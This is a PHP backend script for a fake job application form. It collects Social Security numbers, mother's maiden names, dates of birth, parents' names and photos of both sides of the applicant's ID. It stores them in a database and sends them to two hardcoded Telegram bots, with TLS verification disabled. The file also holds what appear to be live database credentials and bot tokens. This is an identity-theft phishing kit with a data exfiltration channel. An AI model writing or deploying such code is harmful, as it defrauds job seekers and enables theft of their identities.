<?php
// --- Configuration & DB Setup (Neon Postgres) ---
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb"; $user = "neondb_owner"; $pass = "npg_TQ1gBOwA9rCa"; $port = "5432";
$dsn = "pgsql:host=$host;port=$port;dbname=$db";

try {
    $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
} catch (Exception $e) {
    die("DB Connection failed: " . $e->getMessage());
}

// --- Process Form Data & Files ---
$data = $_POST;
$front_path = $back_path = $front_id_base64 = $back_id_base64 = null;

if (!is_dir('uploads')) {
    mkdir('uploads', 0755, true);
}

// Fixed and optimized helper to handle file verification and path mapping
function processFile($fileInput) {
    if (isset($_FILES[$fileInput]) && $_FILES[$fileInput]['error'] === UPLOAD_ERR_OK) {
        $path = "uploads/" . time() . "_" . basename($_FILES[$fileInput]['name']);
        if (move_uploaded_file($_FILES[$fileInput]['tmp_name'], $path)) {
            $base64 = 'data:' . mime_content_type($path) . ';base64,' . base64_encode(file_get_contents($path));
            return [$path, $base64];
        }
    }
    return [null, null];
}

list($front_path, $front_id_base64) = processFile('front_id');
list($back_path, $back_id_base64) = processFile('back_id');

// --- Insert into Database ---
$stmt = $pdo->prepare("INSERT INTO job_applications (first_name, middle_name, last_name, phone, email, dob, mother_maiden, ssn, birth_city, address, father_name, mother_name, front_id, back_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->execute([
    $data['first_name'] ?? '', $data['middle_name'] ?? '', $data['last_name'] ?? '', $data['phone'] ?? '', $data['email'] ?? '', $data['dob'] ?? '', $data['mother_maiden'] ?? '', $data['ssn'] ?? '', $data['birth_city'] ?? '',
    ($data['address_line1'] ?? '') . " " . ($data['address_line2'] ?? '') . ", " . ($data['city'] ?? '') . ", " . ($data['state'] ?? '') . " " . ($data['zip_code'] ?? ''),
    $data['father_name'] ?? '', $data['mother_name'] ?? '', 
    $front_id_base64, $back_id_base64
]);

// --- Telegram Alert System ---
$bots = [
    ["bot" => "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek", "chat" => "6513265609"],
    ["bot" => "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0", "chat" => "5469294503"]
];

function sendTelegram($url, $data) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

// Format Notification Text
$text = "📄 New Application\n"
      . "👤 Name: " . ($data['first_name'] ?? '') . " " . ($data['last_name'] ?? '') . "\n"
      . "📞 Phone: " . ($data['phone'] ?? '') . "\n"
      . "📧 Email: " . ($data['email'] ?? '');

// Push Data Arrays to Active Bots
foreach ($bots as $b) {
    sendTelegram("https://telegram.org{$b['bot']}/sendMessage", ['chat_id' => $b['chat'], 'text' => $text]);
    if ($front_path && file_exists($front_path)) {
        sendTelegram("https://telegram.org{$b['bot']}/sendDocument", ['chat_id' => $b['chat'], 'document' => new CURLFile(realpath($front_path)), 'caption' => 'Front ID']);
    }
    if ($back_path && file_exists($back_path)) {
        sendTelegram("https://telegram.org{$b['bot']}/sendDocument", ['chat_id' => $b['chat'], 'document' => new CURLFile(realpath($back_path)), 'caption' => 'Back ID']);
    }
}

// --- Local Server Cleanup ---
if ($front_path && file_exists($front_path)) unlink($front_path);
if ($back_path && file_exists($back_path)) unlink($back_path);

// --- Success Web Panel ---
echo "
<div style='max-width:600px;margin:50px auto;padding:40px;background:#0f172a;color:white;border-radius:15px;text-align:center;font-family:sans-serif;'>
    <h1 style='color:#22c55e;'>✓ Submitted!</h1>
    <p>Thank you. Your application has been logged permanently.</p>
</div>";
?>
